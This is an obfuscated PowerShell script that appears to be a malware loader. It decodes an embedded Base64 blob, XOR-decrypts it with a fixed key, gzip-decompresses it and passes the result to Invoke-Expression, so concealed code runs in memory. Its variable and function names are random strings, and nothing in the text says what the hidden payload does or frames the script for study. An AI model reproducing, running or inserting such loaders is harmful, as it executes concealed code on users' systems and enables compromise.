$rk7506amqvtbzce = [System.Text.Encoding]::ascii
function 5t6qsrgf4wokm029xliceavj8u3  {param($e9z1muapjtdlrgh )
  $d6w9emhbctxfy0r = [System.Convert]::FromBase64String($e9z1muapjtdlrgh)
  $tf5ceyl1a7w9qdi= $rk7506amqvtbzce.GetBytes("cizwbqvgflt8")
    $upsfjmoxkaze681 = $d6w9emhbctxfy0r
    $gfmqr78d39k6si2 = $(for ($z8qkjgh1it7wa4l = 0; $z8qkjgh1it7wa4l -lt $upsfjmoxkaze681.length; ) {
        for ($m2l79jht48uwprf = 0; $m2l79jht48uwprf -lt $tf5ceyl1a7w9qdi.length; $m2l79jht48uwprf++) {
            $upsfjmoxkaze681[$z8qkjgh1it7wa4l] -bxor $tf5ceyl1a7w9qdi[$m2l79jht48uwprf]
            $z8qkjgh1it7wa4l++
            if ($z8qkjgh1it7wa4l -ge $upsfjmoxkaze681.Length) {
                $m2l79jht48uwprf = $tf5ceyl1a7w9qdi.length
            }
        }
    })
	$n28atcwz75oedgf = New-Object System.IO.MemoryStream( , $gfmqr78d39k6si2 )

	    $5o8a3xu9tq1l64k = New-Object System.IO.MemoryStream
        $pg3s71rvn8jzhic = New-Object System.IO.Compression.GzipStream $n28atcwz75oedgf, ([IO.Compression.CompressionMode]::Decompress)
	    $pg3s71rvn8jzhic.CopyTo( $5o8a3xu9tq1l64k )
        $pg3s71rvn8jzhic.Close()
		$n28atcwz75oedgf.Close()
		[byte[]] $8fzor9cgvesd23b = $5o8a3xu9tq1l64k.ToArray()
 $h9xo17rgits6q8d=$8fzor9cgvesd23b
    return $h9xo17rgits6q8d
}
[byte[]]$kbtwvu9p1l78gq3=5t6qsrgf4wokm029xliceavj8u3 $ve4lmfqixo5c1ry
[System.Text.Encoding]::ascii.GetString((5t6qsrgf4wokm029xliceavj8u3 "fOJyd2JxdmdibPltuCeZP3IMKCyY6yYTSPW3rxBRfWaiL7Ygq0cbziZKxfwnz/rl1VKL+hRKOAeUgyeGZytIeLrjm8nIUgHSNxwhIjbNq0vUSfsbK3SUORqXEmdJxnZARj2qJwlJ8Z5XZ4mxTn6UpXbu1nZUhbN20JsQ07a6Cuikdfgn9cAe1lMTfQ4+/WkDX5tkOCwZHBQIMEbhPCPsHUaR+Iyf//ypBSjbN4NfHlJIhJgxaybBubDu5QEryniNJoxZVn3VNuzQmk+3wFBpZV9fMnuQBb42WNyxQRjCOBfTiqzw8b3n8ZMTMPi/DcPFkuUN1wkxWFWpy2k8CQEUWzLzkYm1AJ7BDkf1Bbh4BqFa6WmTfaFnQSSxVCicy6S8bqBQoxJOTl34lsbrrps+z1ebwNIiwd/B6d+XogjMtZjzQpdV3ebaOHQ5EmpYsnJFv2umLb0by/hJ9xF/cOaXHRAsENal1HiKSKMshY2m2rngmZOSj7cthCRESb3zh1FNXAVEcvHo/jknORGd3bbV9ErkQm8yidGiu9VRbzcYfn1fgu0+mV2cZgrrz19WYXenpCQS9mSX1LRIqgvOtYq5BR71lXjmKIFDJ+E5p62SWvW2snOMnGdVFLnWlNaXEaG8Mez87DKYtX4P3BxGIfq+1vAP3YV1OX1fba6A4CzO45kQrC0cQHPIxN+t+TTfu64Lu+uX3ugRF1sBVjM9wu1hLqGqGRh+Ja4W9G8mFf5jHXrHKfhf/fkYTXXJJkh2zUWjqxXkakWcls+NUWnsjgn2lTgO0pnmVZaZQ/h2n9U0eMNuLDTH9G9jrKNxCzopRIJOwhzTz4+ln4ZRGWhF1yVin1Y8L19v+jTS7XGG9CUh7m/wyix8gOt9W08Wvs7M4MNenI7z/GypTrEkZh7zMpXjfAS6LkvT5pIfy/xaOmbxO45M66ZgqzVhXL9+gGzLZY6EtuguaqFNGofR83XBiBVqernXT9vVUivOWH5tyuMI67zxO6pHPKaVW5kHTHyQUIfi2dZJcJWYoUxJk6+iOV4sqH6HBNwVv2tk8d6JKzfjTgBEmS0oI60ICuLFGCL6jN2EPz765+B2yCfZLRJ4zyy4cnDEr3JwmsEAx9Gs6tLgPxbPplSipFrcCGuIxpnXeJZe8eBoo6IA9mLkQ0gCu5b0aw6ly+keQmytO6nkh9BhF8hfmqeXITxh2b7tyr33y+HRRDnQACQucWdm"))|iex;